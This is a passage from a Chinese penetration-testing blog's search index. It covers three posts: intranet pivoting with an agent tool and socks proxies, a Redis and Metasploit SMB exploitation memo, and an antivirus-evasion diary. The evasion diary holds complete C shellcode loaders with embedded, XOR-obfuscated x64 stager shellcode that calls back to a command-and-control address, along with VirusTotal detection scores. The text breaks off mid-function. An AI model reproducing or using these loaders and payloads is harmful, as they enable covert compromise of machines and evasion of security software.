可以使用show命令查看节点列表，goto 命令进入节点，shell命令获取一个shell goto某一个节点后，使用socks命令在当前主机打开一个socks5代理，以便后续渗透，访问VPS:port 即可。 这样就在VPS:7788开启了一个socks5代理，使用proxifier或者proxychains即可通过代理访问内网其他主机的服务。 在当前节点使用listen命令，在当前主机开启一个端口，等待后续渗透过程中的其他主机连接上线 VM2中间重启了一下，上述listen 8888端口变成了7878，请注意。 ./agent_linux_x64 -rhost 192.168.88.129 -rport 7878 在VPS上可以看到VM2已经连进来了 执行shell也没问题 继续开监听端口 这里可以继续添加socks代理访问该主机同网段的其他服务，但是这次试验没添加同网段主机，所以不做演示。 VM3 看一下能不能执行命令（有360） 没问题，listen一下，等待后续机器连接 VM4 VM4连接VM3调了挺久，防火墙也关了，策略也都做好了，死活ping不通，过一会就好了- - 这样所有的主机都拿到了权限并且可以开启socks代理打内网机器、上传下载文件。 不出网上线CS参考https://www.cy3ng.com/2021/07/29/1/，待完成","categories":[],"tags":[],"author":"Polo"},{"title":"redis主从复制/smb扫描备忘","slug":"redis主从复制-smb扫描备忘","date":"2022-01-09T09:47:11.000Z","updated":"2022-01-09T09:53:48.000Z","comments":true,"path":"2022/01/09/redis主从复制-smb扫描备忘/","link":"","permalink":"https://polosec.github.io/2022/01/09/redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6-smb%E6%89%AB%E6%8F%8F%E5%A4%87%E5%BF%98/","excerpt":"","text":"redis主从复制rce版本要求redis4.x或者5.x，6.x不可以。msf利用smb漏洞时出现 12[-] Exploit failed: RubySMB::Error::EncryptionError Communication error with the remote host: Socket read returned nil. The server supports encryption but was not able to handle the encrypted request.[*] Exploit completed, but no session was created. 时可调整参数 12set SMB::AlwaysEncrypt falseset SMB::ProtocolVersion 1 MSF搜索参数：-S 指定字符串 比如scanner， type指定模块类型。SMB漏洞利用：扫描端口，获得版本，利用漏洞。","categories":[],"tags":[],"author":"Polo"},{"title":"菜鸡的0基础免杀学习记录","slug":"菜鸡的0基础免杀学习记录","date":"2021-12-02T08:16:03.000Z","updated":"2021-12-02T08:22:54.000Z","comments":true,"path":"2021/12/02/菜鸡的0基础免杀学习记录/","link":"","permalink":"https://polosec.github.io/2021/12/02/%E8%8F%9C%E9%B8%A1%E7%9A%840%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","excerpt":"","text":"前言 其实一直对免杀挺感兴趣的，但一直没有下定决心系统的学习，只是半路拿来别人写的过来用一下，所以这次想从最基本的方法开始学习免杀，作为一个记录贴将持续更新免杀方法、代码以及其中我没掌握的知识点。 参考链接https://hack-for.fun/bd13.html windows API/源码函数学习VirtualAlloc123456LPVOID VirtualAlloc( LPVOID lpAddress,内存基址 SIZE_T dwSize,大小 DWORD flAllocationType,分配的类型 DWORD flProtect 该内存的初始保护属性 RWX？); 最简单直接加载shellcode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;// 入口函数int wmain(int argc, TCHAR* argv[]) &#123; int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄/* length: 519 bytes *//* length: 892 bytes */ unsigned char buf[] = &quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x50\\x00\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x4f\\x69\\x42\\x63\\x00\\x3b\\xba\\x07\\xca\\x0e\\x71\\x39\\x4d\\xf4\\x73\\xa0\\x65\\x60\\xbc\\x40\\x25\\xa0\\x17\\x51\\xb3\\xcc\\xe5\\x79\\x2f\\xfb\\x20\\x19\\xa8\\x1a\\x58\\x78\\x64\\x4e\\xf7\\x12\\xef\\x1d\\x0e\\xec\\xe1\\xf5\\x65\\x17\\xc5\\x2f\\xe7\\x82\\xbb\\x5e\\x99\\xa3\\x50\\x8b\\x24\\x8b\\x9c\\xf6\\x14\\xeb\\x83\\x4d\\x85\\x05\\x85\\x88\\xf3\\x0c\\x81\\xb1\\x6a\\x5a\\x7d\\x7b\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x38\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x36\\x2e\\x31\\x3b\\x20\\x57\\x4f\\x57\\x36\\x34\\x3b\\x20\\x54\\x72\\x69\\x64\\x65\\x6e\\x74\\x2f\\x34\\x2e\\x30\\x3b\\x20\\x53\\x4c\\x43\\x43\\x32\\x3b\\x20\\x2e\\x4e\\x45\\x54\\x20\\x43\\x4c\\x52\\x20\\x32\\x2e\\x30\\x2e\\x35\\x30\\x37\\x32\\x37\\x29\\x0d\\x0a\\x00\\x69\\x9b\\xe0\\x7e\\xb2\\xb6\\x38\\x6a\\xbc\\x63\\x5e\\xf9\\x85\\x9c\\x22\\x64\\x17\\x40\\x5a\\x37\\x76\\xe0\\x60\\x04\\x54\\xf3\\x6a\\x65\\x0b\\x6e\\x1e\\x90\\x87\\xb9\\xeb\\xf9\\x85\\x0b\\x22\\xd7\\x64\\x40\\x7c\\x76\\x54\\xd6\\x27\\x7c\\x18\\x2c\\x97\\x47\\x5d\\x0c\\x53\\x8e\\xc8\\xec\\xcc\\x00\\xde\\xfd\\xe8\\x67\\x80\\xbb\\xe5\\xc6\\x61\\x14\\x13\\x3c\\x21\\x4e\\x06\\xf9\\xd9\\x21\\xa7\\x9d\\x4e\\x63\\xc8\\x3b\\xae\\x6e\\xf2\\xe3\\x58\\x29\\x14\\x9a\\xb1\\xec\\xdd\\xc6\\xe4\\x62\\xd0\\x21\\x7c\\xe4\\xcf\\x21\\x51\\xfd\\x16\\x7f\\xcd\\xfe\\x68\\xdc\\xda\\x17\\x1c\\xf7\\xab\\x35\\x79\\x45\\x31\\x17\\xf1\\x30\\xfd\\xdd\\x4f\\xfd\\x35\\xcf\\x94\\xaa\\xbd\\xcb\\x13\\x48\\xd3\\xa5\\x2f\\xb8\\x98\\xed\\x65\\x54\\x18\\x35\\xb2\\x3c\\x23\\x1b\\x8d\\xb4\\x0d\\x62\\xcf\\xe1\\x9b\\x7b\\xe7\\x63\\x2a\\x86\\x8d\\x16\\xe4\\xda\\xfb\\xa4\\x03\\x4b\\x8e\\x1e\\x03\\x03\\xa3\\x4d\\x11\\x1d\\x2a\\xbb\\xc9\\xe1\\xbf\\xb0\\xa5\\x23\\x0d\\xd6\\x6d\\x34\\x99\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x32\\x34\\x38\\x2e\\x31\\x00\\x51\\x09\\xbf\\x6d&quot;; // 获取shellcode大小 shellcode_size = sizeof(buf); /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ char* shellcode = (char*)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); // 将shellcode复制到可执行的内存页中 CopyMemory(shellcode, buf, shellcode_size); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束 return 0;&#125; 免杀效果 vt 21/6559b33f3b4a74e8930a5207bf209f961f45e5eef277c19553c8c5ad3fe203c20d 简单加载器+shellcode XOR123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// 入口函数int wmain(int argc, TCHAR* argv[]) &#123; int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄 unsigned char buf[] = &quot;\\xed\\x59\\x92\\xf5\\xe1\\xf9\\xd9\\x11\\x11\\x11\\x50\\x40\\x50\\x41\\x43\\x40\\x47\\x59\\x20\\xc3\\x74\\x59\\x9a\\x43\\x71\\x59\\x9a\\x43\\x09\\x59\\x9a\\x43\\x31\\x59\\x9a\\x63\\x41\\x59\\x1e\\xa6\\x5b\\x5b\\x5c\\x20\\xd8\\x59\\x20\\xd1\\xbd\\x2d\\x70\\x6d\\x13\\x3d\\x31\\x50\\xd0\\xd8\\x1c\\x50\\x10\\xd0\\xf3\\xfc\\x43\\x50\\x40\\x59\\x9a\\x43\\x31\\x9a\\x53\\x2d\\x59\\x10\\xc1\\x77\\x90\\x69\\x09\\x1a\\x13\\x64\\x63\\x9a\\x91\\x99\\x11\\x11\\x11\\x59\\x94\\xd1\\x65\\x76\\x59\\x10\\xc1\\x41\\x9a\\x59\\x09\\x55\\x9a\\x51\\x31\\x58\\x10\\xc1\\xf2\\x47\\x59\\xee\\xd8\\x50\\x9a\\x25\\x99\\x59\\x10\\xc7\\x5c\\x20\\xd8\\x59\\x20\\xd1\\xbd\\x50\\xd0\\xd8\\x1c\\x50\\x10\\xd0\\x29\\xf1\\x64\\xe0\\x5d\\x12\\x5d\\x35\\x19\\x54\\x28\\xc0\\x64\\xc9\\x49\\x55\\x9a\\x51\\x35\\x58\\x10\\xc1\\x77\\x50\\x9a\\x1d\\x59\\x55\\x9a\\x51\\x0d\\x58\\x10\\xc1\\x50\\x9a\\x15\\x99\\x59\\x10\\xc1\\x50\\x49\\x50\\x49\\x4f\\x48\\x4b\\x50\\x49\\x50\\x48\\x50\\x4b\\x59\\x92\\xfd\\x31\\x50\\x43\\xee\\xf1\\x49\\x50\\x48\\x4b\\x59\\x9a\\x03\\xf8\\x5e\\xee\\xee\\xee\\x4c\\x7b\\x11\\x58\\xaf\\x66\\x78\\x7f\\x78\\x7f\\x74\\x65\\x11\\x50\\x47\\x58\\x98\\xf7\\x5d\\x98\\xe0\\x50\\xab\\x5d\\x66\\x37\\x16\\xee\\xc4\\x59\\x20\\xd8\\x59\\x20\\xc3\\x5c\\x20\\xd1\\x5c\\x20\\xd8\\x50\\x41\\x50\\x41\\x50\\xab\\x2b\\x47\\x68\\xb6\\xee\\xc4\\xfa\\x62\\x4b\\x59\\x98\\xd0\\x50\\xa9\\x41\\x11\\x11\\x11\\x5c\\x20\\xd8\\x50\\x40\\x50\\x40\\x7b\\x12\\x50\\x40\\x50\\xab\\x46\\x98\\x8e\\xd7\\xee\\xc4\\xfa\\x48\\x4a\\x59\\x98\\xd0\\x59\\x20\\xc3\\x58\\x98\\xc9\\x5c\\x20\\xd8\\x43\\x79\\x11\\x13\\x51\\x95\\x43\\x43\\x50\\xab\\xfa\\x44\\x3f\\x2a\\xee\\xc4\\x59\\x98\\xd7\\x59\\x92\\xd2\\x41\\x7b\\x1b\\x4e\\x59\\x98\\xe0\\x59\\x98\\xcb\\x58\\xd6\\xd1\\xee\\xee\\xee\\xee\\x5c\\x20\\xd8\\x43\\x43\\x50\\xab\\x3c\\x17\\x09\\x6a\\xee\\xc4\\x94\\xd1\\x1e\\x94\\x8c\\x10\\x11\\x11\\x59\\xee\\xde\\x1e\\x95\\x9d\\x10\\x11\\x11\\xfa\\xc2\\xf8\\xf5\\x10\\x11\\x11\\xf9\\xb3\\xee\\xee\\xee\\x3e\\x5e\\x78\\x53\\x72\\x11\\x2a\\xab\\x16\\xdb\\x1f\\x60\\x28\\x5c\\xe5\\x62\\xb1\\x74\\x71\\xad\\x51\\x34\\xb1\\x06\\x40\\xa2\\xdd\\xf4\\x68\\x3e\\xea\\x31\\x08\\xb9\\x0b\\x49\\x69\\x75\\x5f\\xe6\\x03\\xfe\\x0c\\x1f\\xfd\\xf0\\xe4\\x74\\x06\\xd4\\x3e\\xf6\\x93\\xaa\\x4f\\x88\\xb2\\x41\\x9a\\x35\\x9a\\x8d\\xe7\\x05\\xfa\\x92\\x5c\\x94\\x14\\x94\\x99\\xe2\\x1d\\x90\\xa0\\x7b\\x4b\\x6c\\x6a\\x11\\x44\\x62\\x74\\x63\\x3c\\x50\\x76\\x74\\x7f\\x65\\x2b\\x31\\x5c\\x7e\\x6b\\x78\\x7d\\x7d\\x70\\x3e\\x25\\x3f\\x21\\x31\\x39\\x72\\x7e\\x7c\\x61\\x70\\x65\\x78\\x73\\x7d\\x74\\x2a\\x31\\x5c\\x42\\x58\\x54\\x31\\x29\\x3f\\x21\\x2a\\x31\\x46\\x78\\x7f\\x75\\x7e\\x66\\x62\\x31\\x5f\\x45\\x31\\x27\\x3f\\x20\\x2a\\x31\\x46\\x5e\\x46\\x27\\x25\\x2a\\x31\\x45\\x63\\x78\\x75\\x74\\x7f\\x65\\x3e\\x25\\x3f\\x21\\x2a\\x31\\x42\\x5d\\x52\\x52\\x23\\x2a\\x31\\x3f\\x5f\\x54\\x45\\x31\\x52\\x5d\\x43\\x31\\x23\\x3f\\x21\\x3f\\x24\\x21\\x26\\x23\\x26\\x38\\x1c\\x1b\\x11\\x78\\x8a\\xf1\\x6f\\xa3\\xa7\\x29\\x7b\\xad\\x72\\x4f\\xe8\\x94\\x8d\\x33\\x75\\x06\\x51\\x4b\\x26\\x67\\xf1\\x71\\x15\\x45\\xe2\\x7b\\x74\\x1a\\x7f\\x0f\\x81\\x96\\xa8\\xfa\\xe8\\x94\\x1a\\x33\\xc6\\x75\\x51\\x6d\\x67\\x45\\xc7\\x36\\x6d\\x09\\x3d\\x86\\x56\\x4c\\x1d\\x42\\x9f\\xd9\\xfd\\xdd\\x11\\xcf\\xec\\xf9\\x76\\x91\\xaa\\xf4\\xd7\\x70\\x05\\x02\\x2d\\x30\\x5f\\x17\\xe8\\xc8\\x30\\xb6\\x8c\\x5f\\x72\\xd9\\x2a\\xbf\\x7f\\xe3\\xf2\\x49\\x38\\x05\\x8b\\xa0\\xfd\\xcc\\xd7\\xf5\\x73\\xc1\\x30\\x6d\\xf5\\xde\\x30\\x40\\xec\\x07\\x6e\\xdc\\xef\\x79\\xcd\\xcb\\x06\\x0d\\xe6\\xba\\x24\\x68\\x54\\x20\\x06\\xe0\\x21\\xec\\xcc\\x5e\\xec\\x24\\xde\\x85\\xbb\\xac\\xda\\x02\\x59\\xc2\\xb4\\x3e\\xa9\\x89\\xfc\\x74\\x45\\x09\\x24\\xa3\\x2d\\x32\\x0a\\x9c\\xa5\\x1c\\x73\\xde\\xf0\\x8a\\x6a\\xf6\\x72\\x3b\\x97\\x9c\\x07\\xf5\\xcb\\xea\\xb5\\x12\\x5a\\x9f\\x0f\\x12\\x12\\xb2\\x5c\\x00\\x0c\\x3b\\xaa\\xd8\\xf0\\xae\\xa1\\xb4\\x32\\x1c\\xc7\\x7c\\x25\\x88\\x11\\x50\\xaf\\xe1\\xa4\\xb3\\x47\\xee\\xc4\\x59\\x20\\xd8\\xab\\x11\\x11\\x51\\x11\\x50\\xa9\\x11\\x01\\x11\\x11\\x50\\xa8\\x51\\x11\\x11\\x11\\x50\\xab\\x49\\xb5\\x42\\xf4\\xee\\xc4\\x59\\x82\\x42\\x42\\x59\\x98\\xf6\\x59\\x98\\xe0\\x59\\x98\\xcb\\x50\\xa9\\x11\\x31\\x11\\x11\\x58\\x98\\xe8\\x50\\xab\\x03\\x87\\x98\\xf3\\xee\\xc4\\x59\\x92\\xd5\\x31\\x94\\xd1\\x65\\xa7\\x77\\x9a\\x16\\x59\\x10\\xd2\\x94\\xd1\\x64\\xc6\\x49\\x49\\x49\\x59\\x14\\x11\\x11\\x11\\x11\\x41\\xd2\\xf9\\x8e\\xec\\xee\\xee\\x20\\x28\\x23\\x3f\\x20\\x27\\x29\\x3f\\x23\\x25\\x29\\x3f\\x20\\x11\\x40\\x18\\xae\\x7c\\x11&quot;; // 获取shellcode大小 shellcode_size = sizeof(buf); /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ //shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存 for (int i = 0; i &lt; shellcode_size; i++) &#123; buf[i] = buf[i] ^ 17; &#125; char* shellcode = (char*)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); // 将shellcode复制到可执行的内存页中 CopyMemory(shellcode, buf, shellcode_size); hThread = CreateThread( NULL, // 安全描述符 NULL, // 栈的大小 (LPTHREAD_START_ROUTINE)shellcode, // 函数 NULL, // 参数 NULL, // 线程标志 &amp;dwThreadId // 线程ID ); WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束 return 0;&#125; 免杀效果 vt14/62ac7eea68dbdf30730fb38ac43d0671c88aacdbcb7b8289740d69e8208923b2df 简单加载器+修改内存页属性+sleep+shellcode xor异或1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// 入口函数int wmain(int argc, TCHAR* argv[]) &#123; int shellcode_size = 0; // shellcode长度 DWORD dwThreadId; // 线程ID HANDLE hThread; // 线程句柄 DWORD dwOldProtect; unsigned char buf[] = &quot;\\xed\\x59\\x92\\xf5\\xe1\\xf9\\xd9\\x11\\x11\\x11\\x50\\x40\\x50\\x41\\x43\\x40\\x47\\x59\\x20\\xc3\\x74\\x59\\x9a\\x43\\x71\\x59\\x9a\\x43\\x09\\x59\\x9a\\x43\\x31\\x59\\x9a\\x63\\x41\\x59\\x1e\\xa6\\x5b\\x5b\\x5c\\x20\\xd8\\x59\\x20\\xd1\\xbd\\x2d\\x70\\x6d\\x13\\x3d\\x31\\x50\\xd0\\xd8\\x1c\\x50\\x10\\xd0\\xf3\\xfc\\x43\\x50\\x40\\x59\\x9a\\x43\\x31\\x9a\\x53\\x2d\\x59\\x10\\xc1\\x77\\x90\\x69\\x09\\x1a\\x13\\x64\\x63\\x9a\\x91\\x99\\x11\\x11\\x11\\x59\\x94\\xd1\\x65\\x76\\x59\\x10\\xc1\\x41\\x9a\\x59\\x09\\x55\\x9a\\x51\\x31\\x58\\x10\\xc1\\xf2\\x47\\x59\\xee\\xd8\\x50\\x9a\\x25\\x99\\x59\\x10\\xc7\\x5c\\x20\\xd8\\x59\\x20\\xd1\\xbd\\x50\\xd0\\xd8\\x1c\\x50\\x10\\xd0\\x29\\xf1\\x64\\xe0\\x5d\\x12\\x5d\\x35\\x19\\x54\\x28\\xc0\\x64\\xc9\\x49\\x55\\x9a\\x51\\x35\\x58\\x10\\xc1\\x77\\x50\\x9a\\x1d\\x59\\x55\\x9a\\x51\\x0d\\x58\\x10\\xc1\\x50\\x9a\\x15\\x99\\x59\\x10\\xc1\\x50\\x49\\x50\\x49\\x4f\\x48\\x4b\\x50\\x49\\x50\\x48\\x50\\x4b\\x59\\x92\\xfd\\x31\\x50\\x43\\xee\\xf1\\x49\\x50\\x48\\x4b\\x59\\x9a\\x03\\xf8\\x5e\\xee\\xee\\xee\\x4c\\x7b\\x11\\x58\\xaf\\x66\\x78\\x7f\\x78\\x7f\\x74\\x65\\x11\\x50\\x47\\x58\\x98\\xf7\\x5d\\x98\\xe0\\x50\\xab\\x5d\\x66\\x37\\x16\\xee\\xc4\\x59\\x20\\xd8\\x59\\x20\\xc3\\x5c\\x20\\xd1\\x5c\\x20\\xd8\\x50\\x41\\x50\\x41\\x50\\xab\\x2b\\x47\\x68\\xb6\\xee\\xc4\\xfa\\x62\\x4b\\x59\\x98\\xd0\\x50\\xa9\\x41\\x11\\x11\\x11\\x5c\\x20\\xd8\\x50\\x40\\x50\\x40\\x7b\\x12\\x50\\x40\\x50\\xab\\x46\\x98\\x8e\\xd7\\xee\\xc4\\xfa\\x48\\x4a\\x59\\x98\\xd0\\x59\\x20\\xc3\\x58\\x98\\xc9\\x5c\\x20\\xd8\\x43\\x79\\x11\\x13\\x51\\x95\\x43\\x43\\x50\\xab\\xfa\\x44\\x3f\\x2a\\xee\\xc4\\x59\\x98\\xd7\\x59\\x92\\xd2\\x41\\x7b\\x1b\\x4e\\x59\\x98\\xe0\\x59\\x98\\xcb\\x58\\xd6\\xd1\\xee\\xee\\xee\\xee\\x5c\\x20\\xd8\\x43\\x43\\x50\\xab\\x3c\\x17\\x09\\x6a\\xee\\xc4\\x94\\xd1\\x1e\\x94\\x8c\\x10\\x11\\x11\\x59\\xee\\xde\\x1e\\x95\\x9d\\x10\\x11\\x11\\xfa\\xc2\\xf8\\xf5\\x10\\x11\\x11\\xf9\\xb3\\xee\\xee\\xee\\x3e\\x5e\\x78\\x53\\x72\\x11\\x2a\\xab\\x16\\xdb\\x1f\\x60\\x28\\x5c\\xe5\\x62\\xb1\\x74\\x71\\xad\\x51\\x34\\xb1\\x06\\x40\\xa2\\xdd\\xf4\\x68\\x3e\\xea\\x31\\x08\\xb9\\x0b\\x49\\x69\\x75\\x5f\\xe6\\x03\\xfe\\x0c\\x1f\\xfd\\xf0\\xe4\\x74\\x06\\xd4\\x3e\\xf6\\x93\\xaa\\x4f\\x88\\xb2\\x41\\x9a\\x35\\x9a\\x8d\\xe7\\x05\\xfa\\x92\\x5c\\x94\\x14\\x94\\x99\\xe2\\x1d\\x90\\xa0\\x7b\\x4b\\x6c\\x6a\\x11\\x44\\x62\\x74\\x63\\x3c\\x50\\x76\\x74\\x7f\\x65\\x2b\\x31\\x5c\\x7e\\x6b\\x78\\x7d\\x7d\\x70\\x3e\\x25\\x3f\\x21\\x31\\x39\\x72\\x7e\\x7c\\x61\\x70\\x65\\x78\\x73\\x7d\\x74\\x2a\\x31\\x5c\\x42\\x58\\x54\\x31\\x29\\x3f\\x21\\x2a\\x31\\x46\\x78\\x7f\\x75\\x7e\\x66\\x62\\x31\\x5f\\x45\\x31\\x27\\x3f\\x20\\x2a\\x31\\x46\\x5e\\x46\\x27\\x25\\x2a\\x31\\x45\\x63\\x78\\x75\\x74\\x7f\\x65\\x3e\\x25\\x3f\\x21\\x2a\\x31\\x42\\x5d\\x52\\x52\\x23\\x2a\\x31\\x3f\\x5f\\x54\\x45\\x31\\x52\\x5d\\x43\\x31\\x23\\x3f\\x21\\x3f\\x24\\x21\\x26\\x23\\x26\\x38\\x1c\\x1b\\x11\\x78\\x8a\\xf1\\x6f\\xa3\\xa7\\x29\\x7b\\xad\\x72\\x4f\\xe8\\x94\\x8d\\x33\\x75\\x06\\x51\\x4b\\x26\\x67\\xf1\\x71\\x15\\x45\\xe2\\x7b\\x74\\x1a\\x7f\\x0f\\x81\\x96\\xa8\\xfa\\xe8\\x94\\x1a\\x33\\xc6\\x75\\x51\\x6d\\x67\\x45\\xc7\\x36\\x6d\\x09\\x3d\\x86\\x56\\x4c\\x1d\\x42\\x9f\\xd9\\xfd\\xdd\\x11\\xcf\\xec\\xf9\\x76\\x91\\xaa\\xf4\\xd7\\x70\\x05\\x02\\x2d\\x30\\x5f\\x17\\xe8\\xc8\\x30\\xb6\\x8c\\x5f\\x72\\xd9\\x2a\\xbf\\x7f\\xe3\\xf2\\x49\\x38\\x05\\x8b\\xa0\\xfd\\xcc\\xd7\\xf5\\x73\\xc1\\x30\\x6d\\xf5\\xde\\x30\\x40\\xec\\x07\\x6e\\xdc\\xef\\x79\\xcd\\xcb\\x06\\x0d\\xe6\\xba\\x24\\x68\\x54\\x20\\x06\\xe0\\x21\\xec\\xcc\\x5e\\xec\\x24\\xde\\x85\\xbb\\xac\\xda\\x02\\x59\\xc2\\xb4\\x3e\\xa9\\x89\\xfc\\x74\\x45\\x09\\x24\\xa3\\x2d\\x32\\x0a\\x9c\\xa5\\x1c\\x73\\xde\\xf0\\x8a\\x6a\\xf6\\x72\\x3b\\x97\\x9c\\x07\\xf5\\xcb\\xea\\xb5\\x12\\x5a\\x9f\\x0f\\x12\\x12\\xb2\\x5c\\x00\\x0c\\x3b\\xaa\\xd8\\xf0\\xae\\xa1\\xb4\\x32\\x1c\\xc7\\x7c\\x25\\x88\\x11\\x50\\xaf\\xe1\\xa4\\xb3\\x47\\xee\\xc4\\x59\\x20\\xd8\\xab\\x11\\x11\\x51\\x11\\x50\\xa9\\x11\\x01\\x11\\x11\\x50\\xa8\\x51\\x11\\x11\\x11\\x50\\xab\\x49\\xb5\\x42\\xf4\\xee\\xc4\\x59\\x82\\x42\\x42\\x59\\x98\\xf6\\x59\\x98\\xe0\\x59\\x98\\xcb\\x50\\xa9\\x11\\x31\\x11\\x11\\x58\\x98\\xe8\\x50\\xab\\x03\\x87\\x98\\xf3\\xee\\xc4\\x59\\x92\\xd5\\x31\\x94\\xd1\\x65\\xa7\\x77\\x9a\\x16\\x59\\x10\\xd2\\x94\\xd1\\x64\\xc6\\x49\\x49\\x49\\x59\\x14\\x11\\x11\\x11\\x11\\x41\\xd2\\xf9\\x8e\\xec\\xee\\xee\\x20\\x28\\x23\\x3f\\x20\\x27\\x29\\x3f\\x23\\x25\\x29\\x3f\\x20\\x11\\x40\\x18\\xae\\x7c\\x11&quot;; // 获取shellcode大小 shellcode_size = sizeof(buf); /* VirtualAlloc( NULL, // 基址 800, // 大小 MEM_COMMIT, // 内存页状态 PAGE_EXECUTE_READWRITE // 可读可写可执行 ); */ //shellcode xor后解密，密码为17,解密后使用virtualalloc分配虚拟内存 for (int i = 0; i &lt; shellcode_size; i++) &#123; buf[i] = buf[i] ^ 17; &#125; char* shellcode = (char*)VirtualAlloc( NULL, shellcode_size, MEM_COMMIT, PAGE_READWRITE ); // 将shellcode复制到可执行的内存页中 CopyMemory(shellcode, buf, shellcode_size); VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, 